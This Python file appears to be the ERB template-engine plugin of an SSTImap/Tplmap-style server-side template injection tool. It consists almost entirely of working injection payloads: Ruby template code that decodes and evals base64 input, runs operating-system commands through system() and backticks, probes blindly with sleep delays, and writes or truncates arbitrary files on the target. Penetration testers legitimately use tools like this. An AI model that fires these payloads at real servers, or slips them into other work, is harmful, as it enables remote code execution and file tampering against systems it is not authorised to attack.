from plugins.languages import ruby
from utils import rand


class Erb(ruby.Ruby):
    priority = 5
    plugin_info = {
        "Description": 'ERB模板引擎',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Homepage: https://docs.ruby-lang.org/en/master/ERB.html",
            "Github: https://github.com/ruby/erb",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': """<%={header[0]}+{header[1]}%>""",
                'trailer': """<%={trailer[0]}+{trailer[1]}%>""",
                'test_render': f"""<%=({rand.randints[0]}*{rand.randints[1]}).to_s%>""",
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'render_error': {
                'render': '{code}',
                'header': """<%$h=({header[0]}+{header[1]}).to_s%>""",
                # Body需要设置b作为输出
                'trailer': """<%$t=({trailer[0]}+{trailer[1]}).to_s%><%File.read("Y:/A:/"+$h+$b+$t)%>""",
                'test_render': f"""<%$b=({rand.randints[0]}*{rand.randints[1]}).to_s%>""",
                'test_render_expected': f'{rand.randints[0] * rand.randints[1]}'
            },
            'evaluate': {
                'evaluate': """<%= {code} %>"""
            },
            'evaluate_error': {
                'evaluate': """<%$b=({code}).to_s%>"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """<%= require'base64';1/(!!eval(Base64.urlsafe_decode64('{code_b64}'))&&1||0) %>"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """<%= require'base64';eval(Base64.urlsafe_decode64('{code_b64}'))&&sleep({delay}) %>"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """<%= require'base64';1 / (system(Base64.urlsafe_decode64('{code_b64}'))&&1||0) %>"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """<%= require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')+' && sleep {delay}'}}) %>"""
            },
            'write': {
                'call': 'inject',
                'write': """<%= require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }} %>""",
                'truncate': """<%= File.truncate('{path}', 0) %>"""
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            # TODO：添加上下文
        ])
